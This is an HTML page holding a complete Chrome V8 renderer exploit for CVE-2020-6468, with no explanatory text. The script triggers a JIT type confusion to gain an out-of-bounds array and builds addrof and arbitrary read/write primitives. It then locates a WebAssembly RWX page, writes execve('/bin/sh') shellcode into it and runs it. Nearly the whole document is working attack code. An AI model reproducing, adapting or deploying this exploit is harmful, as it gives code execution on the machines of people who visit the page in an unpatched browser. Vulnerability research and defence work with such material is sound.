<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2020-6468</title>
    
    <script src="./toolkit.js"></script>
    <!-- <script src="./int64.js"></script> -->

</head>
<body>
    <h1>CVE-2020-6468 Renderer Exploit</h1>
    <pre id="progress" style="font-size: 20px; font-family: monospace;"></pre>
    <script>
        function SAYS_VALUE(msg, value){
            let message = "[+] " + msg + ": " + value.toString() + "\n";
            console.log(message);
            document.getElementById("progress").innerText += message;
        }

        function SAYS(msg){
            let message = "[!] " + msg + "\n";
            console.log(message);
            document.getElementById("progress").innerText += message;
        }

        class classA {
            constructor() {
                this.val = 0x4242;
                this.x = 0;
                this.a = [1,2,3];
            }
        }
        
        class classB {
            constructor() {
                this.val = 0x4141;
                this.x = 1;
                this.s = "dsa";
            }
        }
        
        var A = new classA();
        var B = new classB();

        function opt(arg1, arg2){
            if(arg2 == 41){
                return 5;
            }

            var int8arr = new Int8Array ( 10 ) ;
            qqq = int8arr;
            var z = arg1.x;
            arg1.val = 1000;
            int8arr [ 1500000000 ] = 22 ;

            async function opt2 ( ) {
                const nothing = {} ;
                while ( 1 ) {
                    if ( abc1 | abc2 ) {
                        while ( nothing ) {
                            await 1 ;
                            print(abc3);
                        }
                    }
                }
            }
            opt2();;
        }


        //var craft = new Float64Array([1.1, 1.2, 1.3, 1.4]);
        let x = {a: 1337};
        var unboxed = [2.1, 2.2, 2.3, 2.4, 2.4, 2.4, 2.4, 2.4];
        var boxed = [x, x, x, x, x, x, x, x];
        var oob_arr = new Array(4);
        oob_arr[0] = 1.1;
        var pad = [ 
            new Float64Array([133.7, 133.7]), 
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
            new Float64Array([133.7, 133.7]),
        ];
        

        var i;
        // this may optimize and deopt, that's fine
        for (i=0; i < 20000; i++) {
            opt(A,0);
            opt(B,0);
        }
        // this will optimize it and it won't deopt
        // this loop needs to be less than the previous one
        for (i=0; i < 10000; i++) {
            opt(A,41);
            opt(B,41);
        }
        

        // change the arr length
        opt(oob_arr,0);

        if(oob_arr.length == 4){
            window.location.reload();
        }

        SAYS_VALUE("oob_arr length", oob_arr.length);


        var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        var wasm_mod = new WebAssembly.Module(wasm_code);
        var wasm_instance = new WebAssembly.Instance(wasm_mod);
        var f = wasm_instance.exports.main;
        
        function addrof(target_obj){
            let old_boxed0 = boxed[0];
            boxed[0] = target_obj;
            let boxed_data = Int64.fromDouble(oob_arr[5]); // boxed addr
            let old_unboxed0 = oob_arr[10];
            oob_arr[10] = boxed_data.asDouble(); // overwrite
            let addr = Int64.fromDouble(unboxed[0]);
            boxed[0] = old_boxed0;
            oob_arr[10] = old_unboxed0;

            return addr;
        }

        
        let wasm_addr = addrof(f);
        wasm_addr = Int64.sub(Int64.and(wasm_addr, 0x00000000ffffffff), 0x1);
        SAYS_VALUE("addrof wasm", wasm_addr.toString());

        let unboxed_addr = addrof(unboxed);
        unboxed_addr = Int64.sub(Int64.and(unboxed_addr, 0x00000000ffffffff), 0x1);
        SAYS_VALUE("addrof unboxed", unboxed_addr.toString());


        let isFound = false;
        let offset = 0;
        for(let i=0; i<1000; i++){
            let tmp = Int64.fromDouble(oob_arr[i]);
            if(tmp.toString().includes("0x700000000")){
                SAYS("FOUND");
                SAYS_VALUE(i, Int64.fromDouble(oob_arr[i]).toString());
                SAYS_VALUE(i+1, Int64.fromDouble(oob_arr[i+1]).toString());
                isFound = true;
                offset = i;
                break;
            }
        }

        if(!isFound){
            window.location.reload();
        }

        function fix(value){
            let val = (value.toString()).slice(0, 10).toString();
            if(val[val.length-1] == 0){
                // we need zero prefix!
                return (val.slice(0, 2) + "0" + val.slice(2, val.length-1));
            }else{
                return (val.slice(0, 2)+ "00000000" + val.slice(2, val.length-1));
            }
        }

        function zerofill(value, digit){
            var zeros = Array(digit + 1).join("0");
            return (zeros + value.replace("0x", "")).slice(-digit);
        }

        let tmp = Int64.fromDouble(oob_arr[offset+1]);
        let higher_addr = Int64.and(tmp, 0x00000000ffffffff);
        let lower_addr = fix(Int64.sub(tmp, higher_addr));
        SAYS_VALUE("Leaked higher addr", higher_addr.toString());
        SAYS_VALUE("Leaked lower addr", lower_addr.toString());


        function read8_improve(higher, lower){
            let backup0 = oob_arr[offset];
            let backup1 = oob_arr[offset+1];

            let data = "0x" + zerofill(lower.toString(), 8) + zerofill(higher.toString(), 8);

            oob_arr[offset] = (new Int64("0x0")).asDouble();
            oob_arr[offset+1] = new Int64(data).asDouble(); // setup!

            let crp_idx = 0;
            for(let i=0; i<pad.length; i++){
                let tmp = pad[i];
                    if(tmp[0] != 133.7){ // we got corrupted arr!
                        crp_idx = i;
                        break;
                    }
            }
            let crp_prim = pad[crp_idx];
            let addr = crp_prim[0];
            oob_arr[offset] = backup0;
            oob_arr[offset+1] = backup1;

            //return addr;
            return Int64.fromDouble(addr);
        }


        function write8_improve(higher, lower, value){
            let backup0 = oob_arr[offset];
            let backup1 = oob_arr[offset+1];

            let data = "0x" + zerofill(lower.toString(), 8) + zerofill(higher.toString(), 8);

            oob_arr[offset] = (new Int64("0x0")).asDouble();
            oob_arr[offset+1] = (new Int64(data)).asDouble();

            let crp_idx = 0;
            for(let i=0; i<pad.length; i++){
                let tmp = pad[i];
                    if(tmp[0] != 133.7){ // we got corrupted arr!
                        crp_idx = i;
                        break;
                    }
            }
            let crp_prim = pad[crp_idx];
            crp_prim[0] = value.asDouble();
            oob_arr[offset] = backup0;
            oob_arr[offset+1] = backup1;
        }

        function write_shellcode(higher, lower, shellcode){
            for(let i=0; i<shellcode.length; i++){
                write8_improve(higher, Int64.add(lower, 0x8*i), (new Int64(shellcode[i])));
            }
        }

        // AAR/AAW test
        //unboxed_addr = Int64.add(unboxed_addr, 0x8);
        //let qwe = read8_improve(higher_addr, unboxed_addr);
        //SAYS_VALUE("unboxed+8", Int64.fromDouble(qwe).toString());
        //let boyon = Int64.add(Int64.fromDouble(qwe), "0x9000000000");
        //write8_improve(higher_addr, unboxed_addr, boyon);

        let shared_info_ptr = Int64.add(wasm_addr, 0xc).toString();
        let shared_info = read8_improve(higher_addr, shared_info_ptr);
        shared_info = Int64.and(Int64.sub(shared_info, 0x1), 0x00000000ffffffff);
        SAYS_VALUE("shared info addr", shared_info.toString());

        let code_addr_ptr = Int64.sub(Int64.add(shared_info, 0x4), 0x80);
        let code_addr = read8_improve(higher_addr, code_addr_ptr.toString());
        SAYS_VALUE("rwx page addr", code_addr.toString());

        // reset higher
        higher_addr = Int64.and(code_addr, 0xffff00000000).toString();
        higher_addr = new Int64(higher_addr.slice(higher_addr.length - 8) + higher_addr.slice(0, higher_addr.length - 8)); // shit
        code_addr = Int64.and(code_addr, 0x0000ffffffff);
        
        let shellcode = ["0xbb48c03190909090", "0xff978cd091969dd1", "0x52995f5453dbf748", "0x90050f3bb05e5457"];
        write_shellcode(higher_addr, code_addr, shellcode);

        SAYS("BOOM");

        const sleep = msec => new Promise(resolve => setTimeout(resolve, msec));
        (async () => {

            await sleep(2000);
            alert("spawing shell....");
            f();
        })();

    </script>

</body>
</html>